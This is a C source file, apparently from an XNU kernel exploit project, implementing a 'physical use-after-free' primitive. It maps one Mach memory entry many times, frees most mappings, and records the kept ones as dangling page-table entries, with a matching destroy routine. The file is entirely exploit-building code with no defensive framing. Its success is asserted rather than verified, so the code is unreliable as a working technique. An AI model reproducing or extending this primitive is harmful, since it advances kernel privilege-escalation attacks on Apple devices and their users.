#include "pmap_puaf.h"
#include <stdlib.h>
#include <string.h>
#include <mach/vm_map.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

static kern_return_t make_entry(mach_vm_address_t backing, mach_port_t *out)
{
    mach_vm_size_t esize = PMAP_PUAF_PAGE_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &esize,
        (mach_vm_offset_t)backing, VM_PROT_READ | VM_PROT_WRITE, out, MACH_PORT_NULL);
}

static kern_return_t map_entry(mach_port_t ep, mach_vm_address_t *out)
{
    *out = 0;
    return mach_vm_map(mach_task_self(), out, PMAP_PUAF_PAGE_SZ, 0, VM_FLAGS_ANYWHERE, ep, 0,
        FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
}

int pmap_puaf_create(pmap_puaf_state_t *state)
{
    if (!state) {
        return -1;
    }
    memset(state, 0, sizeof(*state));

    mach_vm_address_t backing = 0;
    kern_return_t kr = mach_vm_allocate(mach_task_self(), &backing, PMAP_PUAF_PAGE_SZ, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        return -1;
    }
    memset((void *)backing, PMAP_PUAF_SENTINEL, PMAP_PUAF_PAGE_SZ);

    mach_port_t entry_port = MACH_PORT_NULL;
    kr = make_entry(backing, &entry_port);
    if (kr != KERN_SUCCESS) {
        mach_vm_deallocate(mach_task_self(), backing, PMAP_PUAF_PAGE_SZ);
        return -1;
    }

    mach_vm_address_t *maps = calloc(PMAP_PUAF_OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) {
        mach_port_deallocate(mach_task_self(), entry_port);
        mach_vm_deallocate(mach_task_self(), backing, PMAP_PUAF_PAGE_SZ);
        return -1;
    }

    int created = 0;
    for (int i = 0; i < PMAP_PUAF_OVERFLOW; i++) {
        kr = map_entry(entry_port, &maps[i]);
        if (kr != KERN_SUCCESS) {
            break;
        }
        created++;
    }

    if (created < PMAP_PUAF_OVERFLOW) {
        free(maps);
        mach_port_deallocate(mach_task_self(), entry_port);
        mach_vm_deallocate(mach_task_self(), backing, PMAP_PUAF_PAGE_SZ);
        return -1;
    }

    int to_free = created - PMAP_PUAF_KEEP;
    if (to_free < 1) {
        free(maps);
        mach_port_deallocate(mach_task_self(), entry_port);
        mach_vm_deallocate(mach_task_self(), backing, PMAP_PUAF_PAGE_SZ);
        return -1;
    }

    for (int i = created - 1; i >= PMAP_PUAF_KEEP; i--) {
        mach_vm_deallocate(mach_task_self(), maps[i], PMAP_PUAF_PAGE_SZ);
    }

    state->backing = backing;
    state->entry_port = entry_port;
    state->maps = maps;
    state->mappings_created = created;
    state->dangling_ptes = PMAP_PUAF_KEEP;
    state->puaf_active = 1;
    return PMAP_PUAF_KEEP;
}

void pmap_puaf_destroy(pmap_puaf_state_t *state)
{
    if (!state || !state->puaf_active) {
        return;
    }

    if (state->maps) {
        for (int i = 0; i < state->dangling_ptes; i++) {
            if (state->maps[i]) {
                mach_vm_deallocate(mach_task_self(), state->maps[i], PMAP_PUAF_PAGE_SZ);
            }
        }
        free(state->maps);
    }

    if (state->entry_port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), state->entry_port);
    }
    if (state->backing) {
        mach_vm_deallocate(mach_task_self(), state->backing, PMAP_PUAF_PAGE_SZ);
    }

    memset(state, 0, sizeof(*state));
}
